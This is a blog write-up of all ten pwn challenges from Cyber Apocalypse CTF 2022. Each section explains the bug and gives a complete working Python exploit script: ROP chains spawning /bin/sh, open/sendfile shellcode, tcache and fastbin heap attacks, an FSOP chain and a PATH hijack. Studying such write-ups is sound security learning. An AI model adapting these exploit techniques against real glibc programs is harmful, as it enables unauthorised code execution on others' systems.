# 2022-Cyber-Apocalypse-CTF-All-Pwn-Wp




> This is my write-up for all pwn challenges in Cyber-Apocalypse-CTF-2022, I had solved all tasks in two days. Anyway, these pwn challenges are not very hard...
>
> Please leave a message or send me an email if you have any questions about the wp. 



<!--more-->



## 1-Entrypoint

### vulnerability

In `check_pass`：

![image-20220520003600243](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520003600243.png)

Look at the `if condition` about `strncmp`,  you can input anything except `0nlyTh30r1g1n4l` to call `open_door`, in which function you can get flag:

![image-20220520003904550](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520003904550.png)

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

sla("> ", "2")

sa("[*] Insert password: ", "wtf")

ia()
```

![image-20220520004008085](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520004008085.png)



## 2-SpacepirateGoingDeeper

### vulnerability



![image-20220520004212542](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520004212542.png)

It's too easy to get flag...just input `DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\x00`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()
context.update(timeout=10)

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


sla(">> ", "2")
sa("Username: ", "DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\x00")

ia()
```

![image-20220520004346069](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520004346069.png)



## 3-Retribution

A basic stack overflow challenge.

### checksec

![image-20220520004714145](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520004714145.png)

### vulnerability

stack overflow:

![image-20220520004648625](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520004648625.png)

steps of solution:

- leak address of glibc using `printf`
- use `rop` to get shell

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

sla(">> ", "2")

sa("y =", "a"*8)

m = rls("[*] New coordinates")
log_ex(m)
code_base = u64_ex(m[-6:]) - 0xd70
log_address("code addr", code_base)
set_current_code_base(code_base)

sa("(y/n):", flat({
    88: [
        code_base + 0x0000000000000d33,
        code_base + 0x202F90,
        elf.plt.puts,
        code_base + 0xa22
    ]
}))

set_current_libc_base_and_log(recv_current_libc_addr(), offset='puts')


sa("y =", "a"*8)
sa("(y/n):", flat({
    88: [
        code_base + 0x0000000000000d33,
        libc.search(b"/bin/sh").__next__(),
        libc.sym.system
    ]
}))

ia()
```

![image-20220520004858277](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520004858277.png)



## 4-Vault-breaker

A trick of `strcpy`

### vulnerability

![image-20220520005030386](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520005030386.png)

A `NULL` character would be appended at the end of the `dst` string in `strcpy`

Use this tip to make `random_key` to become `?\x00\x00\x00....\x00`, and then in the function `secure_password`:

![image-20220520005359834](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520005359834.png)

every byte of the flag xor with every byte of the key, we know `x ^ 0 = x`, so it puts flag if the `random_key` consists of `NULL` character 

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io = gift.io

def genkey(l):
    sla("> ", "1")
    sla("Length of new password (0-31):", str(l))
    ru("New key has been genereated successfully!")


for i in range(31, 0, -1):
    genkey(i)

sla("> ", "2")
ru("Master password for Vault: ")
m = ra()
print(m)

ia()
```

![image-20220520005744727](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520005744727.png)

## 5-FleetManagement

### checksec

![image-20220520005954145](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520005954145.png)

only `rt_sigreturn/openat/senfile` are allowed

### vulnerability

input `9` to write `shellcode`：

![image-20220520010103926](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520010103926.png)

steps:

- `openat(-100, "flag.txt", 0)`
- `sendfile(1, 3, 0, 0x30)`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']

data = asm(shellcraft.amd64.pushstr("flag.txt") + 
        """
        push rsp
        pop rsi
        mov edi, 0xffffff9c
        xor edx, edx
        xor eax, eax
        xor r10d, r10d
        mov eax, {}
        syscall
        xor edi, edi
        xor esi, esi
        xchg eax, esi
        inc edi
        mov r10d, 0x30
        mov al, {}
        syscall
        """.format(constants.SYS_openat, constants.SYS_sendfile))

sleep(3)
sl("1")
io.recvuntil("[*] What do you want to do?", timeout=10)
io.recvuntil("[*] What do you want to do?", timeout=10)
sl("9")
sleep(3)
s(data)
ia()
```

![image-20220520010310089](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520010310089.png)



## 6-Hellbound

### vulnerability

input `1` to leak stack address, and input `3` to assign `buf` with `*buf`: 

![image-20220520200453800](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520200453800.png)

and there is a backdoor function:

![image-20220520200929028](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520200929028.png)

steps:

- leak stack address
- write the address of backdoor  at `retaddr`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

def leak():
    sla(">> ", "1")
    ru("[+] In the back of its head you see this serial number: [")
    m = ru("]")
    stack_addr = int_ex(m[:-1])
    log_address("stack addr", stack_addr)
    return stack_addr


def writecode(code):
    sla(">> ", "2")
    sa("[*] Write some code: ", code)

def deref():
    sla(">> ", "3")
    ru("The beast went Berserk again!")


sd = leak()
writecode(flat([
    0, 
    sd + 0x50
]))
deref()

writecode(flat([
    0x400977, 0
]))

deref()

sla(">> ", str(0x45))

ia()
```

![image-20220520201103021](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520201103021.png)



## 7-Bon-nie-appetit



### checksec

![image-20220520201428114](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520201428114.png)



glibc version is `Ubuntu GLIBC 2.27-3ubuntu1.5`



### vulnerability

There is a `off by one` vuln in  `edit_order`, so that you can change the size of the next chunk.



![image-20220520201405600](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520201405600.png)

Steps of my solution:

1. leak libc address by means of the remaining address of `bk` of a chunk
2. make overlapping chunk using off-by-one
3. use `tcache poisoning attack` to allocate a chunk at `__free_hook`
4. change `__free_hook` to `system` and free a chunk with `/bin/sh`



### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

def new_order(size, data):
    sla("> ", "1")
    sla("[*] For how many: ", str(size))
    sa("[*] What would you like to order: ", data)

def show_order(i):
    sla("> ", "2")
    sla("[*] Number of order: ", str(i))

def edit_order(i, data):
    sla("> ", "3")
    sla("[*] Number of order: ", str(i))
    sa("[*] New order: ", data)

def dele_order(i):
    sla("> ", "4")
    sla("[*] Number of order: ", str(i))


def fina():
    sla("> ", "5")

new_order(0x18, "a"*0x18)
new_order(0x20, "deadbeef")
new_order(0x10, "a"*0x10)
new_order(0x500, "deadbeef")
new_order(0x10, "/bin/sh\x00")

# leak
dele_order(3)
new_order(0x10, "deadbeef")
show_order(3)
libc_addr = recv_current_libc_addr()
set_current_libc_base_and_log(libc_addr, 0x3ec0d0)
edit_order(0, "a"*0x18+"\x51")

dele_order(2)
dele_order(1)

new_order(0x48, flat({
    0x20: [
        0, 0x21,
        libc.sym.__free_hook
    ]
}))

new_order(0x10, "a"*0x10)
new_order(0x10, p64(libc.sym.system))

dele_order(4)

ia()
```

![image-20220520202139221](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520202139221.png)



## 8-TrickorDeal

### vulnerability

leak code base address in `buy`:

![image-20220520202503869](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520202503869.png)

`uaf` in `steal`:

![image-20220520202608565](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520202608565.png)

 and there is a backdoor function:

![image-20220520202643679](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520202643679.png)



step:

1. leak code base address
2. replace the `printStorage` with `unlock_storage`
3. input `1` to get shell



### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

sleep(3)

def show():
    sla("[*] What do you want to do? ", "1")

def buy(data):
    sla("[*] What do you want to do? ", "2")
    sa("[*] What do you want!!? ", data)

def offer(i=0, data=None, c='n'):
    sla("[*] What do you want to do? ", "3")
    sla("[*] Are you sure that you want to make an offer(y/n): ", c)
    if c == "y":
        sla("How long do you want your offer to be? ", str(i))
        sa("[*] What can you offer me? ", data)

@sleep_call_after(5)
def steal():
    sla("[*] What do you want to do? ", "4")


buy("a"*0x38)
ru("a"*0x38)
m = rl()

code_base = u64_ex(m[:-1]) - 0x9b0
log_address("code_base", code_base)

steal()

offer(0x50, data=flat_z({
    0x40: [code_base + 0xeff]*2
}), c='y')

show()


ia()
```

![image-20220520202916507](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520202916507.png)



## 9-Sabotage

### vulnerability

In `enter_command_control`, there is a heap overflow:

![image-20220520203139469](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520203139469.png)

The difference between `putenv` and `setenv` in glibc:

- `putenv` will not allocate memory, it uses the parameter and insert the point you offer into the environment variable list; if the env exists, replace it
- `setenv` will call `malloc` to allocate memory and then copy source string to the new chunk; if the env exists, replace it

When add a new env variable or delete a env variable, `realloc` will be called to adjust the memory dynamically.

**Note:** if there're two or more environment variables with a same `key` in the environment variable list, only the last one is effective!

Steps of getting shell:

1. input `2` to call `putenv`, and make `__environ`(it's a global variable in glibc) point to the heap area instead of stack area, by the way, write `/bin/sh` in `/tmp/panel`
2. input `1` and make use of `heap oveflow` to change the content of `ACCESS` environment variable, replace it with `PATH=/tmp/:/bin:/use/bin`, when call `system("panel")`, it will find the executable binary in `PATH`, and now `/tmp/panel` will be chosen firstly and it will  be executed with `/bin/sh -c`
3. when a script don't specify a interpreter with `#!xxxxx`, every line in the file will be executed with the default shell, which is `/bin/sh` 

### EXP

```
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def access(length, code):
    sla("> ", "1")
    sla("ACCESS code length: ", str(length))
    sla("ACCESS code: ", code) # 0 or \n will stop

def quantum(data, data2):
    sla("> ", "2")
    sla("Quantum destabilizer mount point: ", data)
    sla("uantum destablizer is ready to pass a small armed unit through the enemy's shield: ", data2)


def abort():
    sla("> ", "5")

quantum("panel", "/bin/sh")
access((1 << 64) - 1, flat({
    0x20: "PATH=/tmp:/bin:/usr/bin",
}))

ia()
```

![image-20220520205924621](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520205924621.png)

get shell:

![image-20220520210007472](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520210007472.png)



## 10-once_and_for_all

It's a heap challenge about tcache.

### checksec

![image-20220520210259084](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520210259084.png)



### vulnerability

`UAF` in `fix`: 

![image-20220520210451158](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520210451158.png)

My solution:

1. malloc_consolidation to leak glibc address
2. modify tcache->count using fastbin attack

3. tcache unlinking to modify stderr->chain and let it point to a heap chunk

4. prepare a fake `_IO_FILE` in heap and use FSOP(make use of `_IO_str_finish`) to getshell

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def build_small(idx, size, data="deadbeef"):
    sla(">> ", "1")
    sla("Choose an index: ", str(idx))
    sla("How much space do you need for it: ", str(size))
    if size > 0x1f and size <= 0x38:
        sa("Input your weapon's details: ",data)


def fix_small(idx, size, data=None, v=2):
    sla(">> ", "2")
    sla("Choose an index: ", str(idx))
    sla("How much space do you need for this repair: ", str(size))
    if size > 0x1f and size <= 0x38:
        sa("Input your weapon's details: ", data)
        sla("What would you like to do now?\n1. Verify weapon\n2. Continue\n>> ", str(v))


# show
def examine_small(idx):
    sla(">> ", "3")
    sla("Choose an index: ", str(idx))


def build_big(size=0x1000):
    sla(">> ", "4")
    sla("How much space do you need for this massive weapon: ", str(size))


def giveup():
    sla(">> ", "5")

"""
1. malloc_consolidate to leak glibc address
2. modify tcache->count using fastbin attack
3. tcache unlinking to modify stderr->chain to the heap area
4. FSOP: use _IO_str_finish when exit to getshell
"""

build_small(0, 0x30)
build_small(1, 0x30)
fix_small(0, 0x100)
build_big()

examine_small(0)
# leak libc address
libc_base = recv_current_libc_addr() - 0x3ebcd0
set_current_libc_base_and_log(libc_base)

build_small(2, 0x30)

build_small(6, 0x28)
build_small(7, 0x28)
build_small(9, 0x38, "\x00")
build_small(10, 0x28)
build_small(11, 0x38, p64_ex(0)+p64_ex(libc_base + 0x3e8360 - 8)+p64(0)+p64(libc.sym.system)) # _IO_str_jumps
build_small(12, 0x38)
build_small(13, 0x38)

fix_small(6, 0x100)
fix_small(7, 0x100)
fix_small(6, 0x28, p64(libc_base + 0x3ec6e8 - 0x10)) # stderr->chain


fix_small(0, 0x100)
fix_small(1, 0x100)
fix_small(0, 0x30, p64_ex(libc_base + 0x3eb2d0-0x8))

build_small(3, 0x30)
build_small(4, 0x30)
build_small(5, 0x30, flat([0x408, 0x9]))
build_small(8, 0x28, b"deadbeef" + p64(libc.search(b"/bin/sh").__next__()))

giveup()
sleep(1)
sl("cat flag.txt")

ia()
```

![image-20220520211336926](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520211336926.png)

![image-20220520211403147](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220520211403147.png)



## Reference

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)


---

> Author: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/2022-cyber-apocalypse-ctf-all-pwn-wp/  

